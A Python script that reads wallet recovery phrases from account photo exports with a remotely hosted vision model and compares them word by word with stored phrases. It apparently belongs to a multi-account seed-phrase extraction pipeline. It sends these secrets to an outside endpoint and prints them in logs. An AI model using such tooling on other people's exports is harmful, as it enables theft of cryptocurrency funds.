#!/usr/bin/env python3
"""Verify a stored phrase against its photo, word by word.

The checksum only says "these 12 words are some valid phrase".  This asks the
model to print the words one per line, numbered, and compares them with the
phrase we stored — so a swapped or wrong word shows up as a difference instead
of hiding behind a passing checksum.

    verify_words.py --account x@y.com [--workers 6]
"""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import classify_all as ca  # noqa: E402
from read_phrase import Transcriber, parse_phrase  # noqa: E402
from verify_seeds import fetch, source_for  # noqa: E402
from worker import scan  # noqa: E402

PROMPT = (
    "Read the wallet recovery phrase in this image carefully.\n"
    "Output one word per line, numbered, exactly as printed:\n"
    "1. word\n2. word\n...\n"
    "If a word is blurred or partly hidden, write ? for that word instead of "
    "guessing. If there is no recovery phrase, answer exactly: none"
)


def log(message: str) -> None:
    print(time.strftime("%H:%M:%S ") + message, flush=True)


def numbered_words(raw: str) -> list[str]:
    words: list[str] = []
    for line in (raw or "").splitlines():
        match = re.match(r"\s*(\d{1,2})\s*[.):-]?\s*([A-Za-z?]+)", line)
        if match:
            words.append(match.group(2).lower())
    if not words:
        words = [word for word in re.split(r"[^a-z?]+", (raw or "").lower()) if word]
    return words


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--account", required=True)
    parser.add_argument("--workers", type=int, default=6)
    parser.add_argument("--base-url", default=os.environ.get("VISION_BASE_URL",
                        "https://e1fbo6zesvurm4-8000.proxy.runpod.net/v1"))
    parser.add_argument("--model", default=os.environ.get("VISION_MODEL", "Qwen/Qwen3.5-4B"))
    args = parser.parse_args()

    root = ca.account_roots().get(args.account)
    if not root:
        parser.error(f"no export for {args.account}")
    path = ca.OUT_DIR / f"phrase-{args.account.split('@')[0]}.jsonl"
    rows = [json.loads(line) for line in path.read_text().splitlines() if line.strip()]
    rows = [row for row in rows if row.get("checksum") and row.get("phrase")]
    if not rows:
        log("no phrases to verify")
        return
    log(f"{len(rows)} phrase photos · numbered read each")

    stage = ca.STAGE / f"words-{args.account}"
    fetch(args.account, root, [row["rel"] for row in rows], stage)
    transcriber = Transcriber(args.base_url, args.model, 1536)
    index = scan.word_index()
    results: list[dict] = []

    def work(row: dict) -> dict:
        rel = row["rel"]
        image = source_for(args.account, root, stage, rel)
        stored = row["phrase"].split()
        if image is None:
            return {"rel": rel, "stored": stored, "read": [], "same": False,
                    "error": "missing"}
        outcome = transcriber.run("", image, prompt=PROMPT, max_tokens=260)
        read = numbered_words(outcome.get("raw", "")) if outcome.get("status") == "ok" else []
        while read and read[-1] in ("?",):
            read = read[:-1]
        return {
            "rel": rel,
            "stored": stored,
            "read": read,
            "same": read == stored,
            "unknown": read.count("?"),
            "error": outcome.get("error", ""),
            "raw": outcome.get("raw", "")[:400],
        }

    with ThreadPoolExecutor(max_workers=max(1, min(args.workers, len(rows)))) as pool:
        for record in pool.map(work, rows):
            results.append(record)
            status = "same" if record["same"] else "DIFF"
            log(f"{status} {record['rel']}")

    same = sum(1 for record in results if record["same"])
    log(f"identical {same}/{len(results)}")
    for record in results:
        if record["same"]:
            continue
        log(f"  {record['rel']}")
        log(f"    stored: {' '.join(record['stored'])}")
        log(f"    read  : {' '.join(record['read']) or '(none)'}")
        if record.get("raw"):
            log(f"    raw   : {record['raw'][:160]!r}")
    out = ca.OUT_DIR / f"words-{args.account.split('@')[0]}.json"
    out.write_text(json.dumps(results, indent=1))
    log(f"wrote {out}")
    import shutil

    shutil.rmtree(stage, ignore_errors=True)


if __name__ == "__main__":
    main()
